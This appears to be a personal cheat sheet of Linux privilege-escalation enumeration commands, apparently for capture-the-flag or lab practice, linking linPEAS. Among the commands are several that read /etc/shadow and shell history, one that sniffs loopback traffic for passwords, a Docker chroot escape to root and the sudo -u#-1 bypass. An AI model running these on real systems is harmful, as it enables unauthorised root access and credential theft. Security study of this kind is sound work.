# Enumeration

I only transfer linpeas, if I am not able to find anything manually

- [LinPeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
### Quick Wins

```
ls -la /etc/passwd # See if you can write into /etc/passwd
find / -writable -type d 2>/dev/null # insecure file perms
cat /etc/crontab # crontab
uname -r # Kernel exploit
find / -perm -u=s -type f 2>/dev/null # GTFO Bins now.
docker run -v /:/mnt --rm -it alpine chroot /mnt sh # Docker
sudo -l # Sudo privs on what
getcap -r / 2>/dev/null # ep in end means privilege everything # GTFO Bins.
cat /etc/exports  # Check if rw and "no_root_squash" both are present  # The directory in which both are present is shareable and mountable.
env
cat .bashrc
history
watch -n 1 "ps -aux | grep pass" # grep pass in processes
sudo tcpdump -i lo -A | grep "pass" # sometimes password in here

grep "CRON" /var/log/syslog # inspecting cron logs
```

### Manual Enumeration

```
bash -i # Interactive bash
whoami
id
cat /etc/passwd # If www user us then meaning web server is there
uname -a # Kernel Version and Arch
cat /etc/issue # Kernel Version
Sysinfo
ps aux # What's running by root?
hostname
hostnamectl
ifconfig
ip route
ip a # If connection is connected to more than 1 network
arp -a
/opt/linux_privesc/chisel # Internal running ports
netstat -a # Internal running ports
cat /var/html # Config Files
/sbin/route # Route table
ls -la passwd
cat /etc/passwd | cut -d : -f 1 # Usernames
cat /etc/shadow
cat /etc/group
cat /etc/os-release
cat .bash_history
history
grep -Hs iptables /etc/* # Firewall rules if lucky

'sudo -u#-1 /bin/bash' # !root (no root)

# Find commands
locate flag.txt
which flag.txt
find / -name flag.txt >2/dev/null
```



